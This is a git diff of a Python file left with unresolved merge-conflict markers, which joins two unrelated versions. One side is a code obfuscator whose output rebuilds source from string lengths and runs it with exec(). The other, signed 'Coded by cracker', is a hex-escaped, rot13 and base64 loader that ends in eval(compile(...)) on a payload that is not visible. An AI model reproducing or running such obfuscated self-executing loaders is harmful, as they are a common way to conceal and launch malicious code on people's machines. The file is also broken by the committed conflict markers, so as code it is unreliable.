@@ -1,3 +1,30 @@
+<<<<<<< HEAD
+import random,sys,logging
+
+logging.basicConfig(level=logging.INFO)
+
+def main(files,string):
+	s=open(files).read()
+	z=[]
+	for i in s:
+		z.append(ord(i))
+	pea=[]
+	for i in z:
+		pea.append(string.replace("'","").replace('"','')*i)
+	file="""
+
+
+
+d={};exec("".join([chr(len(i)) for i in d]))
+	""".format(pea)
+	open(files.replace(".py","enc.py"),"w").write(file)
+
+
+try:
+	main(sys.argv[1],sys.argv[2])
+except:
+	print()
+=======
 # Coded by cracker 
 # CRACKER911181  
  
@@ -10,3 +37,4 @@ destiny = 'bMzyfMKZhpzIjoTSwMFtvYaO5VvjvMJ5wYaO5VvxfVapvXF53pzy0MFuznJkyXDbXPaEl
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+>>>>>>> 92deafb008d1bb650e2a2df0d133f097b979d969
